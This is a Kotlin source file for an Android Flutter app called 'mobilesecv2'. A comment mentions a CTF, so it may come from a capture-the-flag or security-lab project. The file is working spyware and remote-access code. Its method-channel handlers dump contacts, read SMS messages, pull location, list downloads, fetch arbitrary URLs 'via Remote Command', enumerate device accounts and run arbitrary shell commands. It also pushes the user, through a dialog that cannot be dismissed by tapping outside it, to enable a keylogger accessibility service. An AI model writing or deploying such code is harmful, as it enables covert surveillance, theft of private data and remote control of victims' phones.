package com.mycompany.mobilesecv2

// Import necessary classes
import android.Manifest // For permissions check
import android.accounts.Account
import android.accounts.AccountManager
import android.app.AlertDialog
import android.app.DownloadManager
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import android.view.accessibility.AccessibilityManager // For Keylogger check
import android.accessibilityservice.AccessibilityServiceInfo // For Keylogger check
import androidx.core.content.ContextCompat // Use androidx
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.File // For file listing/downloading
import java.text.SimpleDateFormat // For SMS date formatting
import java.util.Date // For SMS date formatting
import java.util.Locale // For SMS date formatting

import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.IOException
import java.util.concurrent.TimeUnit

// Make sure KeyLoggerAccessibilityService class exists in the correct package
// import com.mycompany.mobilesecv2.KeyLoggerAccessibilityService


class MainActivity : FlutterActivity() {

    // Channel names (constants are good practice)
    private val KEYLOGGER_CHANNEL = "com.mycompany.mobilesecv2/keylogger"
    private val NATIVE_COMMAND_CHANNEL = "com.mycompany.mobilesecv2/native_commands"
    // Channel Name for receiving location updates from Dart
    private val LOCATION_UPDATE_CHANNEL = "com.mycompany.mobilesecv2/location_update"

    // Tag for logging
    private val TAG = "MainActivityNative"


    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        Log.i(TAG, "Configuring Flutter Engine and Method Channels.")

        // --- Configure Keylogger Method Channel ---
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, KEYLOGGER_CHANNEL).setMethodCallHandler { call, result ->
            Log.d(TAG, "Keylogger channel received call: ${call.method}")
            when (call.method) {
                "startKeyLogger" -> {
                    if (isAccessibilityServiceEnabled()) {
                         Log.i(TAG, "Keylogger check: Accessibility service is enabled.")
                         result.success("Keylogger Accessibility Service is enabled.")
                    } else {
                        Log.w(TAG, "Keylogger check: Accessibility service is NOT enabled.")
                        result.error("PERMISSION_DENIED", "Accessibility Service is not enabled by the user.", null)
                    }
                }
                else -> {
                    Log.w(TAG, "Keylogger channel: Method ${call.method} not implemented.")
                    result.notImplemented()
                }
            }
        }

        // --- Configure Native Commands Method Channel ---
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_COMMAND_CHANNEL).setMethodCallHandler { call, result ->
            Log.d(TAG, "Native command channel received call: ${call.method} with args: ${call.arguments}")
            try {
                when (call.method) {
                    "dumpContacts" -> {
                        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                            result.success(dumpContacts())
                        } else {
                            Log.w(TAG, "dumpContacts failed: READ_CONTACTS permission denied.")
                            result.error("PERMISSION_DENIED", "READ_CONTACTS permission not granted.", null)
                        }
                    }
                    "readSms" -> {
                         if (checkPermission(Manifest.permission.READ_SMS)) {
                            val limit = call.argument<Int>("limit")?.takeIf { it > 0 } ?: 5
                             Log.d(TAG,"readSms called with limit: $limit")
                            result.success(readSms(limit))
                         } else {
                            Log.w(TAG, "readSms failed: READ_SMS permission denied.")
                            result.error("PERMISSION_DENIED", "READ_SMS permission not granted.", null)
                         }
                    }
                    "getLocation" -> {
                         if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) || checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                            val location = LocationServiceHolder.getLastKnownLocation() // Use holder object
                            if (location != null) {
                                Log.d(TAG, "getLocation success: Lat ${location.latitude}, Lng ${location.longitude}")
                                result.success(mapOf("latitude" to location.latitude, "longitude" to location.longitude))
                            } else {
                                Log.w(TAG, "getLocation failed: Location data not available FROM HOLDER.") // Updated log
                                result.error("LOCATION_UNAVAILABLE", "Location data not available in holder yet.", null) // Modified error msg
                            }
                         } else {
                             Log.w(TAG, "getLocation failed: Location permission denied.")
                             result.error("PERMISSION_DENIED", "Location permission (Fine or Coarse) not granted.", null)
                         }
                    }
                     "listDownloads" -> {
                         if (checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                             result.success(listDownloads())
                         } else {
                             Log.w(TAG, "listDownloads failed: READ_EXTERNAL_STORAGE permission denied.")
                             result.error("PERMISSION_DENIED", "READ_EXTERNAL_STORAGE permission not granted.", null)
                         }
                     }
                     "downloadFile" -> {
                         val url = call.argument<String>("url")
                         if (url == null || !isValidUrl(url)) {
                             Log.w(TAG, "downloadFile failed: Invalid or missing URL argument.")
                             result.error("INVALID_ARGS", "Valid URL is required for downloadFile.", url)
                             return@setMethodCallHandler
                         }
                         val hasInternetPermission = checkPermission(Manifest.permission.INTERNET)
                         if (hasInternetPermission) {
                             Log.d(TAG, "downloadFile: Attempting download for URL: $url")
                             downloadFile(url, result)
                         } else {
                             Log.e(TAG, "downloadFile failed: INTERNET permission missing (Manifest issue?).")
                             result.error("PERMISSION_DENIED", "INTERNET permission seems to be missing.", null)
                         }
                     }
                     "getAccounts" -> {
                          if (checkPermission(Manifest.permission.GET_ACCOUNTS)) {
                             if (!checkPermission(Manifest.permission.READ_CONTACTS)) {
                                 Log.w(TAG, "getAccounts: GET_ACCOUNTS granted, but READ_CONTACTS denied (might affect results).")
                             }
                             result.success(getAccounts())
                         } else {
                             Log.w(TAG, "getAccounts failed: GET_ACCOUNTS permission denied.")
                             result.error("PERMISSION_DENIED", "GET_ACCOUNTS permission not granted.", null)
                         }
                     }
                     "executeShellCommand" -> {
                        val command = call.argument<String>("command")
                        if (command == null || command.isBlank()) {
                             Log.w(TAG, "executeShellCommand failed: Command string is null or blank.")
                            result.error("INVALID_ARGS", "Command string cannot be null or empty.", null)
                        } else {
                             Log.i(TAG, "Executing shell command: '$command'")
                             // Ideally, run this in a background thread to avoid blocking UI thread
                             // For simplicity in CTF, running directly here. BEWARE OF ANRs.
                             val outputMap = executeShellCommand(command)
                             result.success(outputMap)
                        }
                    }
                    else -> {
                         Log.w(TAG, "Native command channel: Method ${call.method} not implemented.")
                        result.notImplemented()
                    }
                }
            } catch (e: SecurityException) {
                 Log.e(TAG, "SecurityException executing ${call.method}: ${e.message}", e)
                 result.error("NATIVE_SECURITY_ERROR", "Permission denied or security restriction for ${call.method}.", e.message)
            } catch (e: Exception) {
                 Log.e(TAG, "Exception executing ${call.method}: ${e.message}", e)
                 result.error("NATIVE_EXECUTION_ERROR", "Failed to execute native command ${call.method}: ${e.message}", e.toString())
            }
        }

        // ===>>> Handler for Location Updates FROM Dart <<<===
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, LOCATION_UPDATE_CHANNEL).setMethodCallHandler { call, result ->
            Log.d(TAG, "Location update channel received call: ${call.method}")
            if (call.method == "updateLocation") {
                val lat = call.argument<Double>("latitude")
                val lng = call.argument<Double>("longitude")
                if (lat != null && lng != null) {
                    // Store the received location in the holder
                    Log.i(TAG, "Received location update from Dart: Lat $lat, Lng $lng. Updating holder.")
                    LocationServiceHolder.updateLocation(lat, lng)
                    result.success("Location received by native") // Acknowledge receipt
                } else {
                    Log.w(TAG, "Received invalid location update from Dart: args were null or wrong type")
                    result.error("INVALID_ARGS", "Latitude or longitude missing/invalid in location update", null)
                }
            } else {
                 Log.w(TAG, "Location update channel: Method ${call.method} not implemented.")
                result.notImplemented()
            }
        }
        // =========================================================

         Log.i(TAG, "Flutter Engine configuration complete.")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
         Log.i(TAG, "onCreate called.")
         if (!isAccessibilityServiceEnabled()) {
            Log.w(TAG, "Accessibility Service is not enabled. Showing prompt.")
            showAccessibilityDialog()
        } else {
             Log.i(TAG, "Accessibility Service already enabled.")
        }
         Log.i(TAG, "onCreate finished.")
    }


    // --- Helper to Check Runtime Permissions ---
    private fun checkPermission(permission: String): Boolean {
        val granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        // Log.d(TAG, "Checking permission $permission: ${if (granted) "GRANTED" else "DENIED"}") // Less verbose logging
        return granted
    }

    // --- URL Validation Helper ---
     private fun isValidUrl(url: String?): Boolean {
        return try {
            if (url == null) return false
            val parsedUri = Uri.parse(url)
            parsedUri.scheme != null && (parsedUri.scheme == "http" || parsedUri.scheme == "https") && parsedUri.host != null
        } catch (e: Exception) {
            false
        }
     }

    // --- Native Command Implementations (Keep your full implementations here) ---
    private fun dumpContacts(): List<Map<String, String?>> { /* ... Your full implementation ... */
        Log.d(TAG, "Executing dumpContacts...")
        val contactsList = mutableListOf<Map<String, String?>>()
        val contentResolver = contentResolver
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        var cursor: Cursor? = null
        try {
             cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY + " ASC"
            )
            if (cursor == null) throw Exception("Failed to query contacts provider.")
            Log.d(TAG, "dumpContacts: Found ${cursor.count} phone entries.")
            if (cursor.count > 0) {
                val nameIndex = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY)
                val numberIndex = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (cursor.moveToNext()) {
                    val name = cursor.getString(nameIndex)
                    val number = cursor.getString(numberIndex)
                    if (!number.isNullOrBlank()) {
                       contactsList.add(mapOf("name" to name, "phone" to number))
                    }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "dumpContacts Exception: ${e.message}"); throw e
        } finally { cursor?.close(); Log.d(TAG, "dumpContacts finished.") }
        return contactsList
    }
    private fun readSms(limit: Int): List<Map<String, String?>> { /* ... Your full implementation ... */
        Log.d(TAG, "Executing readSms with limit $limit...")
        val smsList = mutableListOf<Map<String, String?>>()
        val contentResolver = contentResolver
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE)
        val sortOrder = Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT $limit"
        var cursor: Cursor? = null
         try {
             cursor = contentResolver.query(uri, projection, null, null, sortOrder)
             if (cursor == null) throw Exception("Failed to query SMS provider.")
             Log.d(TAG, "readSms: Found ${cursor.count} SMS messages.")
             if (cursor.count > 0) {
                val addressIndex = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIndex = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateIndex = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val typeIndex = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                while (cursor.moveToNext()) {
                    val address = cursor.getString(addressIndex)
                    val body = cursor.getString(bodyIndex)
                    val dateMillis = cursor.getLong(dateIndex)
                    val typeInt = cursor.getInt(typeIndex)
                    val dateStr = dateFormat.format(Date(dateMillis))
                    val typeStr = when (typeInt) { /* ... type mapping ... */
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
                        // Add other types as needed
                        else -> "UNKNOWN ($typeInt)"
                    }
                    smsList.add(mapOf("address" to address, "body" to body, "date" to dateStr, "type" to typeStr))
                }
             }
         } catch (e: Exception) { Log.e(TAG, "readSms Exception: ${e.message}"); throw e
         } finally { cursor?.close(); Log.d(TAG, "readSms finished.") }
        return smsList
     }
    private fun listDownloads(): List<String> { /* ... Your full implementation ... */
        Log.d(TAG, "Executing listDownloads...")
        val downloadsList = mutableListOf<String>()
        try {
             val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
             Log.d(TAG, "Listing files in: ${downloadsDir.absolutePath}")
             if (!downloadsDir.exists()) return listOf("Downloads directory does not exist.")
             if (!downloadsDir.isDirectory) return listOf("Path exists but is not a directory.")
             val files = downloadsDir.listFiles() ?: throw SecurityException("Failed listFiles()")
             Log.d(TAG, "Found ${files.size} items.")
             files.forEach { file -> downloadsList.add("${file.name} (${if (file.isDirectory) "DIR" else "FILE"})") }
        } catch (e: Exception) { Log.e(TAG, "listDownloads Exception: ${e.message}"); throw e }
         Log.d(TAG, "listDownloads finished.")
        return downloadsList
    }
    private fun downloadFile(url: String, result: MethodChannel.Result) { /* ... Your full implementation ... */
         Log.d(TAG, "Executing downloadFile for URL: $url")
         try {
             val downloadManager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager?
                 ?: throw Exception("DownloadManager service not available.")
             val parsedUri = Uri.parse(url)
             val request = DownloadManager.Request(parsedUri)
             val filename = parsedUri.lastPathSegment ?: "downloaded_file_${System.currentTimeMillis()}"
             request.setTitle(filename)
             request.setDescription("Downloading via Remote Command")
             request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
             request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename)
             request.setAllowedOverMetered(true)
             request.setAllowedOverRoaming(true)
             val downloadId = downloadManager.enqueue(request)
             Log.i(TAG, "Download enqueued with ID: $downloadId")
             result.success("Download started for '$filename' (ID: $downloadId). Check Notifications/Downloads folder.")
         } catch (e: Exception) {
             Log.e(TAG, "downloadFile Exception: ${e.message}", e)
             val errorCode = if (e is SecurityException) "PERMISSION_DENIED" else if (e is IllegalArgumentException) "INVALID_ARGS" else "DOWNLOAD_SETUP_ERROR"
             result.error(errorCode, "Failed to start download: ${e.message}", e.toString())
         }
    }
    @Suppress("MissingPermission")
    private fun getAccounts(): List<Map<String, String>> { /* ... Your full implementation ... */
        Log.d(TAG, "Executing getAccounts...")
        val accountsList = mutableListOf<Map<String, String>>()
        try {
            if (!checkPermission(Manifest.permission.GET_ACCOUNTS)) {
                 throw SecurityException("GET_ACCOUNTS permission not granted at time of use.")
            }
            val accountManager = AccountManager.get(this)
            val accounts: Array<Account> = accountManager.accounts
            Log.d(TAG, "AccountManager returned ${accounts.size} accounts.")
            accounts.forEach { account ->
                 Log.d(TAG, "Found account: Name=${account.name}, Type=${account.type}")
                 accountsList.add(mapOf("name" to account.name, "type" to account.type))
            }
        } catch (e: Exception) { Log.e(TAG, "getAccounts Exception: ${e.message}"); throw e }
        Log.d(TAG, "getAccounts finished.")
        return accountsList
    }
    private fun executeShellCommand(command: String): Map<String, Any> {
        val output = StringBuilder()
        val errorOutput = StringBuilder()
        var exitCode = -1 // Default to error exit code

        try {
            // Using ProcessBuilder is generally preferred over Runtime.exec
            // It doesn't handle shell built-ins like 'cd' directly, but good for external commands.
            // Split the command string into parts if using ProcessBuilder list constructor,
            // or use Runtime.exec for simpler cases (handles basic piping/redirection sometimes).
            // Let's use Runtime.exec for simplicity here, assuming commands are like 'ls -l /path'.
            val process = Runtime.getRuntime().exec(command)

            // Read standard output
            val stdInput = BufferedReader(InputStreamReader(process.inputStream))
            var s: String?
            while (stdInput.readLine().also { s = it } != null) {
                output.append(s).append("\n")
            }
            stdInput.close() // Close the reader

            // Read standard error
            val stdError = BufferedReader(InputStreamReader(process.errorStream))
            while (stdError.readLine().also { s = it } != null) {
                errorOutput.append(s).append("\n")
            }
            stdError.close() // Close the reader

            // Wait for the process to complete, with a timeout
            // Important to prevent indefinite blocking if the command hangs
            val timeoutSeconds = 15L
            if (process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                exitCode = process.exitValue()
                 Log.d(TAG, "Shell command '$command' finished with exit code: $exitCode")
            } else {
                // Timeout occurred
                Log.w(TAG, "Shell command '$command' timed out after $timeoutSeconds seconds.")
                errorOutput.append("\n--- ERROR: Command timed out after $timeoutSeconds seconds ---")
                process.destroy() // Forcefully terminate the process
                exitCode = -2 // Indicate timeout
            }

        } catch (e: IOException) {
            Log.e(TAG, "IOException executing command '$command': ${e.message}")
            errorOutput.append("\n--- ERROR: IOException: ${e.message} ---")
            // Common causes: Command not found, permission denied to execute
            exitCode = -3 // Indicate IO error
        } catch (e: InterruptedException) {
             Log.w(TAG, "InterruptedException while waiting for command '$command': ${e.message}")
             Thread.currentThread().interrupt() // Restore interrupted status
             errorOutput.append("\n--- ERROR: InterruptedException while waiting ---")
             exitCode = -4 // Indicate interruption
        } catch (e: Exception) {
            Log.e(TAG, "Generic Exception executing command '$command': ${e.message}", e)
            errorOutput.append("\n--- ERROR: Unexpected Exception: ${e.message} ---")
            exitCode = -5 // Indicate generic error
        }

        // Trim trailing newlines if they exist
        val finalOutput = if (output.isNotEmpty() && output.last() == '\n') output.dropLast(1).toString() else output.toString()
        val finalError = if (errorOutput.isNotEmpty() && errorOutput.last() == '\n') errorOutput.dropLast(1).toString() else errorOutput.toString()

        return mapOf(
            "stdout" to finalOutput,
            "stderr" to finalError,
            "exitCode" to exitCode
        )
    }


    // --- Accessibility Service Helpers (Keep your full implementations here) ---
    private fun showAccessibilityDialog() { /* ... Your full implementation ... */
         AlertDialog.Builder(this)
             .setTitle("Accessibility Service Required") // ... rest of dialog setup ...
             .setMessage("...")
             .setPositiveButton("Go to Settings") { dialog, _ -> /* ... */ startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); dialog.dismiss() }
             .setNegativeButton("Cancel") { dialog, _ -> /* ... */ dialog.dismiss() }
             .setCancelable(false).show()
    }
    private fun isAccessibilityServiceEnabled(): Boolean { /* ... Your full implementation ... */
        val serviceId = "$packageName/com.mycompany.mobilesecv2.KeyLoggerAccessibilityService"
        try {
            val setting = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (setting?.split(':')?.contains(serviceId) == true) return true
            // Fallback check (optional)
            // val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager?
            // if (am?.isEnabled == true) { ... check am.getEnabledAccessibilityServiceList ... }
        } catch (e: Exception) { Log.e(TAG, "Error checking accessibility: ${e.message}") }
        return false
    }

} // End of MainActivity


// --- LocationServiceHolder object (Keep as is) ---
object LocationServiceHolder {
    private var lastLat: Double? = null
    private var lastLng: Double? = null
    private val TAG = "LocationServiceHolder"

    @Synchronized fun updateLocation(lat: Double, lng: Double) {
        lastLat = lat; lastLng = lng
        Log.d(TAG, "Stored location updated: Lat $lastLat, Lng $lastLng")
    }
    @Synchronized fun getLastKnownLocation(): SimpleLocation? {
        return if (lastLat != null && lastLng != null) SimpleLocation(lastLat!!, lastLng!!) else null
    }
}
data class SimpleLocation(val latitude: Double, val longitude: Double)